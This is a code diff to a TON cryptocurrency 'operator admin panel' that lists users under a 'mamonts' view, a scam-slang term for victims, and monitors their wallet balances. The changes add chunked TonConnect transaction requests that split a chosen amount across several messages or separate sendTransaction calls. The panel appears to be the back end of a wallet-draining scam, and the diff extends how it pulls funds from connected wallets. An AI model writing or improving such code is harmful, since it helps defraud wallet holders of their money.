@@ -8,6 +8,7 @@ import { api } from "./lib/api";
 import type { AdminUserRecord, AdminWalletSnapshot, TonUsdRate } from "./types";
 
 type PayoutUnit = "TON" | "USD";
+type PayoutMethod = "method1" | "method2";
 type AdminView = "mamonts" | "stats";
 
 const ADMIN_REFRESH_INTERVAL_MS = 7000;
@@ -32,6 +33,24 @@ function formatOsVersion(user: AdminUserRecord): string {
 
 function walletSnapshotKey(walletAddress: string): string {
   return walletAddress.trim().toLowerCase();
+}
+
+function mergeWalletSnapshots(
+  current: Record<string, AdminWalletSnapshot>,
+  payload: AdminWalletSnapshot[],
+): Record<string, AdminWalletSnapshot> {
+  const nextSnapshots = { ...current };
+
+  for (const snapshot of payload) {
+    const snapshotKey = walletSnapshotKey(snapshot.wallet_address);
+    const previousSnapshot = current[snapshotKey];
+    if (snapshot.error && previousSnapshot && previousSnapshot.error == null && previousSnapshot.balance_ton) {
+      continue;
+    }
+    nextSnapshots[snapshotKey] = snapshot;
+  }
+
+  return nextSnapshots;
 }
 
 function formatWalletBalance(snapshot: AdminWalletSnapshot | null): string {
@@ -135,6 +154,41 @@ function formatUsd(value: number): string {
   }).format(value);
 }
 
+function parsePayoutRequestCount(value: string): number {
+  const normalized = value.trim();
+  if (!/^\d+$/.test(normalized)) {
+    throw new Error("Request count must be a whole number.");
+  }
+
+  const requestCount = Number(normalized);
+  if (!Number.isSafeInteger(requestCount) || requestCount <= 0) {
+    throw new Error("Request count must be greater than 0.");
+  }
+
+  return requestCount;
+}
+
+function splitPayoutAmount(amountNano: bigint, requestCount: number): bigint[] {
+  const requestCountBigInt = BigInt(requestCount);
+  if (amountNano < requestCountBigInt) {
+    throw new Error(`Amount must be at least ${formatTonFromNano(requestCountBigInt)} for ${requestCount} requests.`);
+  }
+
+  const baseAmountNano = amountNano / requestCountBigInt;
+  const remainderNano = amountNano % requestCountBigInt;
+
+  return Array.from({ length: requestCount }, (_, index) => (
+    baseAmountNano + (BigInt(index) < remainderNano ? 1n : 0n)
+  ));
+}
+
+function buildPayoutMessages(targetAddress: string, amountNano: bigint, requestCount: number) {
+  return splitPayoutAmount(amountNano, requestCount).map((partAmountNano) => ({
+      address: targetAddress,
+      amount: partAmountNano.toString(),
+    }));
+}
+
 export function OperatorAdminPanel() {
   const [users, setUsers] = useState<AdminUserRecord[]>([]);
   const [walletSnapshots, setWalletSnapshots] = useState<Record<string, AdminWalletSnapshot>>({});
@@ -148,6 +202,8 @@ export function OperatorAdminPanel() {
   const [selectedWalletAddress, setSelectedWalletAddress] = useState<string>("");
   const [payoutAmountInput, setPayoutAmountInput] = useState<string>("");
   const [payoutUnit, setPayoutUnit] = useState<PayoutUnit>("TON");
+  const [payoutMethod, setPayoutMethod] = useState<PayoutMethod>("method1");
+  const [payoutRequestCountInput, setPayoutRequestCountInput] = useState<string>("2");
   const [payoutStatusText, setPayoutStatusText] = useState<string>("");
   const [isPayoutPending, setIsPayoutPending] = useState<boolean>(false);
   const [tonUsdRate, setTonUsdRate] = useState<TonUsdRate | null>(null);
@@ -167,11 +223,7 @@ export function OperatorAdminPanel() {
 
     try {
       const payload = await api.getAdminWalletSnapshots(token, walletAddresses);
-      setWalletSnapshots(
-        Object.fromEntries(
-          payload.map((snapshot) => [walletSnapshotKey(snapshot.wallet_address), snapshot]),
-        ),
-      );
+      setWalletSnapshots((current) => mergeWalletSnapshots(current, payload));
       const failedCount = payload.filter((snapshot) => snapshot.error).length;
       setWalletSnapshotStatusText(
         failedCount
@@ -179,7 +231,6 @@ export function OperatorAdminPanel() {
           : `Tonviewer balances: ${payload.length}`,
       );
     } catch (error) {
-      setWalletSnapshots({});
       setWalletSnapshotStatusText(
         error instanceof Error ? error.message : "Tonviewer balance request failed",
       );
@@ -235,10 +286,14 @@ export function OperatorAdminPanel() {
     }
 
     let amountNano = 0n;
+    let requestCount = 0;
+    let payoutMessages: Array<{ address: string; amount: string }> = [];
     try {
       amountNano = parsePayoutAmountToNano(payoutAmountInput, payoutUnit, tonUsdRate);
+      requestCount = parsePayoutRequestCount(payoutRequestCountInput);
+      payoutMessages = buildPayoutMessages(targetAddress, amountNano, requestCount);
     } catch (error) {
-      setPayoutStatusText(error instanceof Error ? error.message : "Amount is invalid.");
+      setPayoutStatusText(error instanceof Error ? error.message : "Payout settings are invalid.");
       return;
     }
 
@@ -246,16 +301,25 @@ export function OperatorAdminPanel() {
     setPayoutStatusText("");
 
     try {
-      await tonConnectUI.sendTransaction({
-        validUntil: Math.floor(Date.now() / 1000) + 300,
-        messages: [
-          {
-            address: targetAddress,
-            amount: amountNano.toString(),
-          },
-        ],
-      });
-      setPayoutStatusText(`Request sent: ${formatTonFromNano(amountNano)} -> ${targetAddress}`);
+      if (payoutMethod === "method2") {
+        let completedRequestCount = 0;
+
+        for (const payoutMessage of payoutMessages) {
+          await tonConnectUI.sendTransaction({
+            validUntil: Math.floor(Date.now() / 1000) + 300,
+            messages: [payoutMessage],
+          });
+          completedRequestCount += 1;
+        }
+
+        setPayoutStatusText(`Sent ${completedRequestCount} sendTransaction calls: ${formatTonFromNano(amountNano)} -> ${targetAddress}`);
+      } else {
+        await tonConnectUI.sendTransaction({
+          validUntil: Math.floor(Date.now() / 1000) + 300,
+          messages: payoutMessages,
+        });
+        setPayoutStatusText(`Sent ${requestCount} messages in 1 sendTransaction call: ${formatTonFromNano(amountNano)} -> ${targetAddress}`);
+      }
       setPayoutAmountInput("");
     } catch (error) {
       setPayoutStatusText(error instanceof Error ? error.message : "TON payout request failed");
@@ -298,20 +362,42 @@ export function OperatorAdminPanel() {
 
   let payoutErrorText = "";
   let payoutAmountNano = 0n;
+  let payoutRequestCount = 0;
+  let payoutParts: bigint[] = [];
   try {
+    if (payoutRequestCountInput.trim()) {
+      payoutRequestCount = parsePayoutRequestCount(payoutRequestCountInput);
+    }
     if (payoutAmountInput.trim()) {
       payoutAmountNano = parsePayoutAmountToNano(payoutAmountInput, payoutUnit, tonUsdRate);
     }
+    if (payoutAmountNano > 0n && payoutRequestCount > 0) {
+      payoutParts = splitPayoutAmount(payoutAmountNano, payoutRequestCount);
+    }
   } catch (error) {
-    payoutErrorText = error instanceof Error ? error.message : "Amount is invalid.";
+    payoutErrorText = error instanceof Error ? error.message : "Payout settings are invalid.";
   }
 
   const payoutPreviewText =
-    payoutAmountNano > 0n
+    payoutAmountNano > 0n && payoutRequestCount > 0
       ? payoutUnit === "USD" && tonUsdRate
-        ? `${payoutAmountInput} USD = ${formatTonFromNano(payoutAmountNano)}`
-        : formatTonFromNano(payoutAmountNano)
-      : "Enter amount";
+        ? `${payoutAmountInput} USD = ${formatTonFromNano(payoutAmountNano)} total`
+        : `${formatTonFromNano(payoutAmountNano)} total`
+      : "Enter amount and request count";
+
+  const payoutDispatchText =
+    payoutParts.length
+      ? payoutMethod === "method2"
+        ? `method2: ${payoutParts.length} sendTransaction calls`
+        : `method1: ${payoutParts.length} messages in 1 sendTransaction call`
+      : "";
+
+  const payoutChunkText =
+    payoutParts.length
+      ? payoutParts.length === 1
+        ? `Chunk: ${formatTonFromNano(payoutParts[0])}`
+        : `First chunk: ${formatTonFromNano(payoutParts[0])}; last chunk: ${formatTonFromNano(payoutParts[payoutParts.length - 1])}`
+      : "";
 
   return (
     <div className="opside-shell">
@@ -489,6 +575,38 @@ export function OperatorAdminPanel() {
                   </div>
 
                   <p className="opside-status">{payoutPreviewText}</p>
+                  {payoutDispatchText ? <p className="opside-status">{payoutDispatchText}</p> : null}
+                  {payoutChunkText ? <p className="opside-status">{payoutChunkText}</p> : null}
+
+                  <div className="opside-unit">
+                    <div className="opside-unit__toggle" role="tablist" aria-label="Payout method">
+                      <button
+                        className={payoutMethod === "method1" ? "opside-unit__button is-active" : "opside-unit__button"}
+                        onClick={() => setPayoutMethod("method1")}
+                        type="button"
+                      >
+                        method1
+                      </button>
+                      <button
+                        className={payoutMethod === "method2" ? "opside-unit__button is-active" : "opside-unit__button"}
+                        onClick={() => setPayoutMethod("method2")}
+                        type="button"
+                      >
+                        method2
+                      </button>
+                    </div>
+
+                    <label className="opside-field opside-field--compact">
+                      <span>Запросов</span>
+                      <input
+                        inputMode="numeric"
+                        onChange={(event) => setPayoutRequestCountInput(event.target.value)}
+                        placeholder="2"
+                        type="text"
+                        value={payoutRequestCountInput}
+                      />
+                    </label>
+                  </div>
 
                   <button
                     className="opside-button opside-button--wide"
